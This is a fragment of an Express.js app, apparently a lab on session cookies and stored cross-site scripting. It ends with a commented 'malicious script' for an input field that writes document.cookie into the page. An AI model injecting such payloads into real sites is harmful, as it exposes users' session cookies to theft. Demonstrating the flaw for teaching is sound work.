...
let posts = []; // Stores user-submitted posts

//Step 1: Generate a session ID only when visiting /login
app.get("/login", (req, res) => {
  res.clearCookie("sid"); // Clear any existing session cookie
...
//Malicious Script- (2nd input field)

//<script>document.body.innerHTML += "<p>Stolen: " + document.cookie + "</p>";</script>
